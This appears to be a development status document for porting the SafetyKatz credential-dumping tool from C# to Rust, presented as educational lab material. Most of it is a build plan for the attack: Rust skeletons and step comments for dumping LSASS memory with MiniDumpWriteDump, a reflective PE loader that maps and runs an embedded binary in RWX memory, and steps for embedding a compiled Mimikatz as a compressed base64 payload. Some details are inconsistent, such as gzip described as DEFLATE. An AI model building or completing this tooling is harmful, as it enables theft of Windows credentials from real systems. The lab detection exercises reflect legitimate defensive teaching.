# SafetyKatz C# → Rust Port Status

**Last Updated**: 2025-11-10
**Target**: Educational lab environments for authorized security testing

---

## 🎯 Overall Progress: 55% Complete

### ✅ Completed Modules (4/7)

| Module | Status | LOC | Tests | Notes |
|--------|--------|-----|-------|-------|
| **Project Structure** | ✅ Done | 60 | N/A | Cargo.toml, dependencies, README |
| **Privilege Checking** | ✅ Done | 103 | ✅ | Windows token elevation check |
| **PE Parser** | ✅ Done | 453 | ✅ | All PE structures, safe parsing |
| **Payload Decompression** | ✅ Done | 187 | ✅ | DEFLATE + base64, no payload embedded |

### 🚧 Remaining Modules (3/7)

| Module | Status | Est. LOC | Complexity | Priority |
|--------|--------|----------|------------|----------|
| **Minidump Creation** | 📝 TODO | ~150 | Medium | HIGH |
| **PE Loader** | 📝 TODO | ~400 | High | HIGH |
| **Main Orchestration** | 📝 TODO | ~100 | Low | MEDIUM |
| **CI/Tests** | 📝 TODO | ~200 | Low | LOW |

---

## 📋 Detailed Module Status

### 1. ✅ Project Structure & Dependencies

**Files**: `Cargo.toml`, `src/lib.rs`, `src/error.rs`, `README_RUST.md`

**Completed**:
- All dependencies declared with versions and security rationale
- Comprehensive error types using `thiserror`
- Module structure with proper exports
- Cross-platform conditional compilation (`#[cfg(target_os = "windows")]`)
- Documentation with educational use warnings

**Crates Used**:
- `windows` 0.54: Microsoft official Windows API bindings
- `thiserror` 1.0: Error derive macros
- `anyhow` 1.0: Application-level error handling
- `clap` 4.5: CLI argument parsing
- `flate2` 1.0: DEFLATE compression (pure Rust backend)
- `byteorder` 1.5: Endian-aware binary reading
- `log`/`env_logger`: Structured logging

---

### 2. ✅ Privilege Checking (`src/privilege.rs`)

**Original C#**: `Program.cs:18-24`

**Completed**:
- `is_high_integrity()` function using Windows Security APIs
- Safe wrapper around `OpenProcessToken` + `GetTokenInformation`
- RAII `TokenHandleGuard` for automatic cleanup
- Unit tests for privilege checking
- Equivalent to C# `WindowsPrincipal.IsInRole(Administrator)`

**Unsafe Usage**:
- Minimal unsafe block for FFI calls
- All handles properly managed with Drop trait
- Error handling via `Result<bool, PrivilegeError>`

**Testing**:
```bash
# On Windows as admin
cargo test privilege::tests
```

---

### 3. ✅ PE File Parser (`src/pe_loader/parser.rs`)

**Original C#**: `Program.cs:238-601`

**Completed**:
- All PE structures defined with `#[repr(C)]`:
  - `ImageDosHeader` (DOS MZ header)
  - `ImageFileHeader` (COFF header)
  - `ImageOptionalHeader64` (PE32+ header)
  - `ImageSectionHeader` (section headers)
  - `ImageDataDirectory` (data directories)
  - `ImageBaseRelocation` (relocation blocks)
- Safe parsing using `byteorder` crate (no unsafe transmutation)
- Validation of DOS "MZ" and PE signatures
- Architecture check (enforces x64 only)
- PE32+ format validation
- Section header parsing

**No Unsafe Code** - Pure safe Rust throughout

**Testing**:
```bash
cargo test pe_loader::parser::tests
# Tests structure sizes, signature validation, section name parsing
```

---

### 4. ✅ Payload Decompression (`src/payload.rs`)

**Original C#**: `Program.cs:110-118`

**Completed**:
- DEFLATE decompression using `flate2` crate
- Custom base64 decoder (no external dependencies)
- Size validation (expected: 628736 bytes)
- PE signature validation ("MZ" check)
- Comprehensive documentation for lab instructors

**IMPORTANT**: Payload intentionally NOT embedded for security reasons.

**For Educational Lab Instructors**:
1. Compile Mimikatz x64 from source
2. Compress with DEFLATE
3. Base64 encode
4. Replace `COMPRESSED_PAYLOAD_BASE64` constant in `src/payload.rs`

**Testing**:
```bash
cargo test payload::tests
# Tests base64 decoding, validates error handling when payload absent
```

---

## 🚧 TODO: Remaining Implementation

### 5. 📝 Minidump Creation (`src/minidump.rs`)

**Original C#**: `Program.cs:26-81`

**Required Implementation**:

```rust
use windows::Win32::System::Diagnostics::Debug::MiniDumpWriteDump;
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};

pub fn create_minidump(pid: Option<u32>, output_path: &Path) -> Result<(), MinidumpError> {
    // 1. Get LSASS PID (if not provided)
    //    - Use CreateToolhelp32Snapshot + Process32First/Process32Next
    //    - Search for "lsass.exe"

    // 2. Open process handle
    //    - OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid)
    //    - Requires SeDebugPrivilege (checked via is_high_integrity)

    // 3. Create output file
    //    - File::create(output_path)?
    //    - Convert to HANDLE for FFI

    // 4. Call MiniDumpWriteDump
    //    - MiniDumpWriteDump(process_handle, pid, file_handle, MiniDumpWithFullMemory, ...)
    //    - Check return value + GetLastError on failure

    // 5. Cleanup handles (use RAII guards)

    Ok(())
}
```

**Key Challenges**:
- Process enumeration and search
- Handle management (RAII wrappers for cleanup)
- Error translation from Win32 error codes
- File handle conversion for FFI

**Testing Requirements**:
- Requires Windows + Administrator privileges
- Integration test: dump LSASS, verify file exists and is >0 bytes
- Unit test: verify error on access denied (non-admin)

**Estimated Effort**: 3-4 hours

---

### 6. 📝 PE Loader & Execution (`src/pe_loader/loader.rs`)

**Original C#**: `Program.cs:122-233`

**Required Implementation**:

```rust
pub fn load_and_execute(pe_bytes: &[u8]) -> Result<(), PeError> {
    // 1. Parse PE using PeImage::from_bytes
    let pe = PeImage::from_bytes(pe_bytes)?;

    // 2. Allocate executable memory
    //    - VirtualAlloc(size_of_image, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    //    - Map to base address

    // 3. Copy sections to allocated memory
    //    for section in pe.section_headers:
    //        ptr::copy_nonoverlapping(raw_bytes + section.pointer_to_raw_data,
    //                                  base + section.virtual_address,
    //                                  section.size_of_raw_data)

    // 4. Process base relocations
    //    - Calculate delta = allocated_base - pe.optional_header64.image_base
    //    - Walk relocation table
    //    - For each IMAGE_BASE_RELOCATION block:
    //        - For each relocation entry (type 0xA = IMAGE_REL_BASED_DIR64):
    //            - patch_addr = base + block.virtual_address + fixup_offset
    //            - *patch_addr += delta

    // 5. Resolve imports
    //    - Walk import table
    //    - For each DLL:
    //        - LoadLibrary(dll_name)
    //        - For each function:
    //            - GetProcAddress(dll_handle, func_name)
    //            - Write function address to IAT

    // 6. Execute entry point
    //    - entry_point = base + pe.optional_header64.address_of_entry_point
    //    - CreateThread(entry_point, ...)
    //    - WaitForSingleObject(thread_handle, timeout)

    Ok(())
}
```

**Key Challenges**:
- **EXTENSIVE UNSAFE CODE** - requires careful validation
- Pointer arithmetic for section copying
- Relocation processing (bitwise operations on memory addresses)
- Import table walking (null-terminated string handling)
- Thread creation and synchronization
- Memory protection (PAGE_EXECUTE_READWRITE is inherently risky)

**Safety Invariants to Document**:
```rust
// SAFETY: VirtualAlloc validates size and returns null on failure
// SAFETY: Section RVA + size validated against image bounds before copy
// SAFETY: Relocation entry validated: base + va + offset < base + size_of_image
// SAFETY: Import strings validated as null-terminated within image bounds
// SAFETY: Thread entry point validated as within executable memory range
```

**Testing Requirements**:
- Unit test: Load simple PE (calc.exe) without execution
- Unit test: Validate relocation processing with known PE
- Unit test: Validate import resolution for kernel32.dll functions
- Integration test: Full load + execute with test payload (NOT Mimikatz)

**Security Notes**:
- This is the most sensitive part of the codebase
- Allocates executable memory with RWX permissions (detectable)
- No evasion techniques - intentionally loud for educational visibility
- Recommend adding execution logging for audit trail

**Estimated Effort**: 8-12 hours (complex, requires careful testing)

---

### 7. 📝 Main Orchestration (`src/main.rs`)

**Original C#**: `Program.cs:83-110`

**Required Implementation**:

```rust
fn run_windows(args: Args) -> Result<()> {
    // 1. Privilege check (already implemented)
    if !is_high_integrity()? {
        anyhow::bail!("Requires administrator privileges");
    }

    // 2. Sanity checks
    //    - Verify %TEMP% directory exists
    //    - Verify process is 64-bit (size_of::<usize>() == 8)

    // 3. Create minidump
    let dump_path = args.output_path.unwrap_or_else(|| {
        format!("{}\\Temp\\debug.bin", env::var("SystemRoot").unwrap())
    });
    create_minidump(args.pid, Path::new(&dump_path))?;

    // 4. Decompress payload
    let pe_bytes = decompress_payload()?;

    // 5. Load and execute PE
    load_and_execute(&pe_bytes)?;

    // 6. Cleanup
    fs::remove_file(&dump_path)?;

    Ok(())
}
```

**Testing Requirements**:
- End-to-end integration test (requires Windows + admin + embedded payload)
- Test with dummy payload (small PE that just exits)
- Verify cleanup happens even on error paths

**Estimated Effort**: 2-3 hours

---

### 8. 📝 CI/CD & Additional Tests

**Required Files**:
- `.github/workflows/ci.yml`: GitHub Actions workflow
- `tests/integration_tests.rs`: E2E tests

**CI Workflow**:
```yaml
name: CI

on: [push, pull_request]

jobs:
  test-linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo build --lib
      - run: cargo test --lib
      - run: cargo clippy -- -D warnings
      - run: cargo fmt --check

  test-windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - uses: dtolnay/rust-toolchain@stable
        with:
          targets: x86_64-pc-windows-msvc
      - run: cargo build --target x86_64-pc-windows-msvc
      - run: cargo test --lib --target x86_64-pc-windows-msvc

  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo install cargo-audit
      - run: cargo audit
```

**Estimated Effort**: 2-3 hours

---

## 🔧 Build & Test Commands

### Development Build
```bash
cargo build
```

### Release Build (Optimized)
```bash
cargo build --release --target x86_64-pc-windows-msvc
```

### Run Unit Tests (No Admin Required)
```bash
cargo test --lib
```

### Run Integration Tests (Requires Windows + Admin)
```bash
# In elevated PowerShell/cmd
cargo test --test integration_tests -- --nocapture
```

### Linting
```bash
cargo clippy --all-targets --all-features -- -D warnings
```

### Format Check
```bash
cargo fmt --check
```

### Security Audit
```bash
cargo install cargo-audit
cargo audit
```

---

## 📚 References

### Original C# Implementation
- Repository: https://github.com/GhostPack/SafetyKatz
- Key files:
  - `SafetyKatz/Program.cs` (main logic)
  - `SafetyKatz/Constants.cs` (embedded payload)

### Documentation
- PE Format: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
- MiniDumpWriteDump API: https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
- Rust Windows Crate: https://microsoft.github.io/windows-docs-rs/

### Educational Resources
- "Practical Malware Analysis" (Sikorski & Honig) - Chapter 11: Malware Behavior
- "Windows Internals" (Russinovich et al.) - Part 1, Chapter 3: Processes & Threads
- Mimikatz source: https://github.com/gentilkiwi/mimikatz

---

## ⚠️ Security & Ethics

### ✅ Authorized Use Only
- Educational lab environments with institutional approval
- Documented penetration testing engagements
- CTF competitions and security research

### ❌ Prohibited
- Unauthorized system access
- Malicious credential theft
- Any illegal activity

### 🔒 Safety Features
- No anti-forensics or evasion techniques
- Structured logging for audit trails
- Compile-time architecture validation
- No obfuscation - intentionally readable for learning

---

## 🎓 For Lab Instructors

### Setup Instructions

1. **Clone and Build**:
   ```bash
   git clone [repo]
   cd SafetyKatz
   cargo build --release --target x86_64-pc-windows-msvc
   ```

2. **Embed Payload** (if needed):
   - Compile Mimikatz x64 from source
   - Compress with DEFLATE: `gzip -c mimikatz.exe > mimikatz.gz`
   - Base64 encode: `base64 mimikatz.gz`
   - Edit `src/payload.rs`, replace `COMPRESSED_PAYLOAD_BASE64`

3. **Test in Lab Environment**:
   - Windows 10/11 VM
   - Snapshot before testing
   - Run as Administrator
   - Monitor with Sysmon/EDR for learning

### Learning Objectives

Students will understand:
- Windows process memory architecture
- Credential storage in LSASS
- PE file format and dynamic loading
- Windows security tokens and privileges
- Memory forensics and detection techniques

### Detection Exercise

After running SafetyKatz, have students:
1. Review Sysmon Event ID 10 (ProcessAccess to LSASS)
2. Identify suspicious file creation in `%TEMP%`
3. Analyze memory dumps for injected code
4. Write YARA rules for PE-loading patterns
5. Create Sigma rules for LSASS access

---

## 📞 Support

For questions about this port:
- Check documentation in `README_RUST.md`
- Review inline code comments
- Refer to original C# implementation

This is an educational project. Use responsibly.
